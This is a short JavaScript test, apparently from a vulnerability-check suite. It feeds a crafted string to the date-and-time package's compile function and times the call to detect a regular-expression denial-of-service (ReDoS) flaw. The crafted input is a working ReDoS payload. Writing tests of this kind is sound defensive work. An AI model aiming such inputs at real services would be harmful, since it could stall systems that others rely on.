// test("ReDoS in date-and-time", () => {
  const measureTime = require("../utils").measureTime;
  const date = require("date-and-time");
  let attack_str = "[" + "z".repeat(25) + "";
  let t = measureTime(function () {
    date.compile(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
if (time > 1) {
	console.log("this_is_vulnerable")
} else {
	console.log("this_is_OK")
}
// });
